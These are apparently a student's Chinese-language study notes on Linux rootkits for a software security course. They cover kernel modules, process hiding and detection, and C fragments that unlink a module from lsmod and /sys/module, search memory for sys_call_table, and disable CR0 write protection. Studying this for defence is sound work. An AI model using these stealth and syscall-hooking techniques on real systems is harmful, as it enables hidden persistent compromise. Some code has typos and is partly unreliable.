> 软件安全原理大作业 RootKit 相关资料阅读

#### Linux 模块编程和 syscall hook 技巧

**Loadable Kernel Module, LKM**

| Item     | 应用编程        | 内核编程                                   |
| :------- | :-------------- | :----------------------------------------- |
| 使用函数 | glibc(如printf) | 内核函数(如printk)                         |
| 头文件   | /usr/include/   | /usr/src/linux-headers-`uname -r`/include/ |
| 编译     | gcc             | Makefile                                   |
| 连接     | gcc             | insmod                                     |
| 运行     | execve          | insmod                                     |
| 调试     | gdb             | kdb                                        |
| 运行权限 | 普通用户        | root                                       |
| 运行空间 | 用户空间        | 内核空间                                   |
| 入口函数 | main()          | module_init()/init_module()                |
| 退出函数 | exit()          | module_exit()/cleanup_module()             |

```makefile
# Makefile example

obj-m += hello_kernel.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
	
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

通过 `-C` 选项找到内核源码根目录下的 Makefile

相关命令：

- insmod 状态
- lsmod 查看
- rmmod 卸载
- dmesg 查看输出信息 
- strace 跟踪系统调用

syscall hook 步骤：

1. 使用 SIDT 定位 IDT
2. 通过 IDT 定位系统调用处理例程
3. 扫描寻找并保存系统调用表的位置
4. 关闭写保护，覆盖调用表项

#### Linux 下常见进程隐藏和侦测手段

用户态隐藏

1. 替换进程查看工具 ps, to, lsof；防护手段：hash，系统完整性检测

2. hook 系统调用，如 getdents，libc 中 readdir

3. 利用环境变量 `LD_PRELOAD` 或配置 `ld.so.preload` 加载恶意动态库

   2 3 可以写脚本遍历 /proc 防御

4. 伪造进程名

5. 挂载覆盖，挂在空路径到对应 pid 下，可以查看 `/proc/mount` 挂载情况

内核隐藏，rootkit

1. 劫持 vfs 函数
2. 劫持系统调用，getdents 对应 sys_getdents，readdir 对应 proc_pid_readdir
3. 新增模块，lsmod 查看
4. 劫持进程创建模块代码

#### Rootkit 系列一：LKM 的基础编写及隐藏

LKM, Loadable Kernel Modules，可加载内核模块，主要是用来扩展 linux 的内核功能。

一个基本的 LKM：

```c
// lkm.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static int lkm_init(void) {
    printk("module loaded");
    return 0;
}
static void lkm_exit(void) {
    printk("module removed");
}

module_init(lkm_init);
module_exit(lkm_exit);
```

`lkm_init` 是初始化函数，模块加载时执行，`lkm_exit` 是清除函数，卸载时执行。

*如果模块未定义清楚函数，则内核不允许卸载该模块。*

内核中使用 `printk` 函数输出，可以通过 `dmesg` 查看输出信息，也可以使用 `KERN_ALERT` 将信息输出到控制台。

```makefile
obj-m := lkm.o

KDIR := /lib/modules/`uname -r`/build
PWD := `shell pwd`

default:
	make -C $(KDIR) M=$(PWD) modules
clean:
	make -C $(KDIR) M=$(PWD) clean
```

使用 `insmod` 命令安装模块，`rmmod` 命令卸载模块，`lsmod` 查看内核模块。

**从 `lsmod` 命令中隐藏我们的模块**

对 `dmesg` 隐藏不输出即可。

`lsmod` 原理：

- 通过 `/proc/modules` 获取当前系统模块信息
- 而 `/proc/modules` 是内核利用 `struct module` 结构体的表头遍历内核模块链表，从所有模块结构体中获取模块信息。

`insmod` 命令实际执行 `init_module` 系统调用，把内核模块插入内核时，模块便与一个  `struct module` 结构体相关联。

所有的内核模块都维护在一个全局链表，链表头是一个全局变量 `struct module *modules`。新创建的模块会从头部插入，通过 `modules->next` 可引用到。

为了对 `lsmod` 隐藏，我们需要在这个链表中删除我们的模块：

```c
list_del_init(&__this_module.list);

// /include/linux/list.h
static inline void list_del_init(struct list_head *entry) {
	__list_del(entry->prev, entry->next);
	INIT_LIST_HEAD(entry);
}
static inline void __list_del(struct list_head * prev, struct list_head * next) {
	next->prev = prev;
	prev->next = next;
}
static inline void INIT_LIST_HEAD(struct list_head *list) {
	list->next = list;
	list->prev = list;
}
```

实现了对 `lsmod` 和 `/proc/modules` 的隐藏

在 `/sys/module` 中还可以发现现有模块，在初始化中添加：

```c
kobj_del(&THIS_MODULE->mkobj.kobj);

// /include/linux/export.h
extern struct module __this_module;
#define THIS_MODULE (&__this_module)

// /lib/kobject.c
void kobject_del(struct kobject *kobj);
```

就可以在 `/sys/module` 中隐藏模块。

#### Linux Rootkit 系列二：syscall table hook

最简单的 syscall hook 是修改 `sys_call_table`：

```c
asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1] = {
	/*
	 * Smells like a compiler bug -- it doesn't work
	 * when the & below is removed.
	 */
	[0 ... __NR_syscall_max] = &sys_ni_syscall,
#include <asm/syscalls_64.h>
};
```

要修改它，先拿到在内存中的位置，然后关闭写保护。

**获取 `sys_call_table` 的内存地址**

1. 暴力搜索内存空间（可能被欺骗

2. 读取 `/boot/System.map` 

3. 使用 `sys_call_table` 的某些未导出函数的机器码进行特征搜索

   1. get IDTR using SIDT

   2. extract the IDT address from the IDTR

   3. get the address of `system_call` from the 0x80th entry of the IDT

      `call <sys_call_table address>(, %eax, 4)` in memory is:

      `0xff 0x14 0x85 0x{sys_call_table address}`

   4. search `system_call` for code fingerprint

4.  `kallsyms_lookup_name("sys_call_table");` 如果这个函数没有导出就不能用。

5. `/proc/kallsyms` 文件

```c
unsigned long **get_sys_call_table(void) {
    unsigned long **entry = (unsigned long **)PAGE_OFFSET;
    for(; (unsinged long)entry < ULONG_MAX; entry += 1) {
        if(entry[__NR_close] == (unsigned long*)sys_close) {
            return entry;
        }
    }
    return NULL;
}
```

`PAGE_OFFSET` 是内核内存空间的起始地址。`sys_close` 是导出函数，可直接得到地址。

**关闭写保护**

找到地址，下面就要关闭下保护。由 `CR0` 寄存器的第 16 位控制。可以使用 `read_cr0/write_cr0` 读写，置位或置零使用 `set_bit/clear_bit`。

```c
void disable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    clear_bit(16, &cr0);
    write_cr0(cr0);
}

void enable_write_protection(void) {
    unsigned long cr0 = read_cr0();
    set_bit(16, &cr0);
    write_cr0(cr0);
}
```

现在就可以修改调用表了，先保存好原始的再覆盖。

 